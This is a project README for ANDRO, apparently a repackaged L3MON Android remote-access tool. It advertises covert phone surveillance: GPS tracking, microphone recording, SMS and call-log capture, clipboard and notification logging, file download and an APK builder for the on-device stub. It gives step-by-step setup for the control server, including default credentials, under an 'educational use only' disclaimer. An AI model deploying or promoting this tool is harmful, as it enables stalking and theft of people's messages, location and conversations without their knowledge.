**Disclaimer** : This software or tool is meant for educational purposes only. we are not responsible for any malicious use of the app.
<p align="center">
<img src="https://github.com/AryanVBW/ANDRO/releases/download/A1/andro__1_-removebg-preview.png" height="150"><br>
A cloud based remote android managment suite, powered by ARYAN
</p>




## Features
- GPS Logging
- Microphone Recording
- View Contacts
- SMS Logs
- Send SMS
- Call Logs
- View Installed Apps
- View Stub Permissions
- Live Clipboard Logging
- Live Notification Logging
- View WiFi Networks (logs previously seen)
- File Explorer & Downloader
- Command Queuing
- Built In APK Builder


## Prerequisites 
 - Java Runtime Environment 8
    - See [installation](#Installation) for OS specifics
 - NodeJs 
 - A Server

## Installation 
1. Install JRE 8 (We cannot stress this enough USE java 1.8.0 ANY issues that dont use this will be closed WITHOUT a response)
    - Debian, Ubuntu, Etc
        - `sudo apt-get install openjdk-8-jre`
    - Fedora, Oracle, Red Hat, etc
        -  `su -c "yum install java-1.8.0-openjdk"`
    - Windows 
        - click [HERE](https://www.oracle.com/technetwork/java/javase/downloads/jre8-downloads-2133155.html) for downloads

2. Install NodeJS [Instructions Here](https://nodejs.org/en/download/package-manager/) (If you can't figure this out, you shouldn't really be using this)

3. install PM2 
    - `npm install pm2 -g`

4. Download and Extract the latest release from [HERE](https://github.com/AryanVBW/ANDRO/releases/download/V.1/L3MON-2024.zip)

5. In the extracted folder, run these commands
    - `npm install` <- install dependencies
    - `pm2 start index.js` <-- start the script
    - `pm2 startup` <- to run ANDRO on startup

6. Set a Username & Password
    1. Stop ANDRO `pm2 stop index`
    2. Open `maindb.json` in a text editor
    3. under `admin` 
        - set the `username` as plain text {Default is aryan}
        - set the `password` as a LOWERCASE MD5 hash {default pass is ANDRO}
    4. save the file
    5. run `pm2 restart all`

7. in your browser navigate to `http://<SERVER IP>:22533`
8. `http://localhost:22533`
    
It's recommended to run ANDRO behind a reverse proxy such as [NGINX](https://www.nginx.com/resources/wiki/start/topics/tutorials/install/)

## Contributor
   - [Vinayak](https://www.instagram.com/mr_vinayak_1427)
   - J
## Demo Login page & Control Panel


<a href="https://github.com/AryanVBW/ANDRO"><img src="https://github.com/AryanVBW/ANDRO/releases/download/logos2024/shot2.png" alt="Darkside"></a>
<a href="https://github.com/AryanVBW/ANDRO"><img src="https://github.com/AryanVBW/ANDRO/releases/download/logos2024/apkbilder.png" alt="Darkside"></a>
<a href="https://github.com/AryanVBW/ANDRO"><img src="https://github.com/AryanVBW/ANDRO/releases/download/logos2024/logs.png" alt="Darkside"></a>
<a href="https://github.com/AryanVBW/ANDRO"><img src="https://github.com/AryanVBW/ANDRO/releases/download/logos2024/deivicepanel.png" alt="Darkside"></a>
<a href="https://github.com/AryanVBW/ANDRO"><img src="https://github.com/AryanVBW/ANDRO/releases/download/logos2024/location.png" alt="Darkside"></a>
## Notes
When opening an issue, you **MUST** use the provided templates. Issues without this will not recieve support quickly and will be put to the bottom of the figurative pile.

Please have a look through the current issues, open and closed to see if your issue has been addressed before. If it's java related, it's most definitely been addressed - In short Use Java 1.8.0
## Thanks
ANDRO Builds off and utilizes serveral opensource softwares, Without these, ANDRO Wouldn't be what it is!
 - [express](https://github.com/expressjs/express)
 - [node-geoip](https://github.com/bluesmoon/node-geoip)
 - [lowdb](https://github.com/typicode/lowdb)
 - [socket.io](https://github.com/socketio/socket.io)
 - [Open Street Map](https://www.openstreetmap.org)
 - [Leaflet](https://leafletjs.com/)
 - L3MON by D3LV 
 
## Disclaimer
<b>Aryan Provides no warranty with this software and will not be responsible for any direct or indirect damage caused due to the usage of this tool.<br>
ANDRO is built for both Educational and Internal use ONLY.</b>

<br>
<p align="center">Made 🕸️ By <a href="whiteDevilVBW@proton.me">*Aryan*</a></p>
<p align="center" style="font-size: 8px">v1.1.2</p>



